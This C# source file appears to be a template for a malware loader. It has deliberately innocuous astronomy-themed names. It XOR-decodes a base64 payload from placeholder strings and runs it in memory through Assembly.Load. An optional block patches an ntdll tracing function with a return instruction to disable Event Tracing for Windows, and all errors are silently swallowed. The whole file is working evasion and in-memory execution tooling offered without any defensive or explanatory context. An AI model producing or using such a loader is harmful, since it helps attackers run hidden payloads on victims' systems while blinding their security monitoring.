using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace StellarEntity
{
    internal class CosmicArray
    {
        static void Main(string[] args)
        {
#if ETW_PATCHER
            CelestialRedirector.Redirect(new byte[] { 0xc2, 0x14, 0x00 });
#endif
            CelestialRedirector.Execute(OrbitalArray.TransformedSignals);
        }
    }

    internal class OrbitalArray
    {
        public static string EncodedSignals = "%BYTES_ENC%";
        public static string CosmicKey = "%KEY_ENC%";
        public static byte[] TransformedSignals = ArrayTransformer.TransformSignals(EncodedSignals, CosmicKey);
    }

    internal class ArrayTransformer
    {
        public static byte[] TransformSignals(string signalData, string cosmicCipher)
        {
            byte[] encSignals = Convert.FromBase64String(signalData);
            byte[] decSignals = new byte[encSignals.Length];

            for (int i = 0; i < encSignals.Length; i++)
            {
                decSignals[i] = (byte)(encSignals[i] ^ cosmicCipher[i % cosmicCipher.Length]);
            }

            return decSignals;
        }
    }

    internal class CelestialRedirector
    {
#if ETW_PATCHER
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void Redirect(byte[] cosmicPatch)
        {
            try
            {
                uint previousProtection;
                var ntdllLibrary = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("%ntdll_lib%")));
                var cosmicEvent = GetProcAddress(ntdllLibrary, Encoding.UTF8.GetString(Convert.FromBase64String("%etwtrace%")));


                VirtualProtect(cosmicEvent, (UIntPtr)cosmicPatch.Length, 0x40, out previousProtection);
                Marshal.Copy(cosmicPatch, 0, cosmicEvent, cosmicPatch.Length);
            }
            catch
            {
                return;
            }
        }
#endif
        public static void Execute(byte[] celestialPayload)
        {
            try
            {
                Assembly loadedAssembly = Assembly.Load(celestialPayload);
                MethodInfo cosmicEntryPoint = loadedAssembly.EntryPoint;
                if (cosmicEntryPoint != null)
                {
                    object[] parameters = cosmicEntryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                    cosmicEntryPoint.Invoke(null, parameters);
                }
            }
            catch
            {
                return;
            }
        }
    }
}
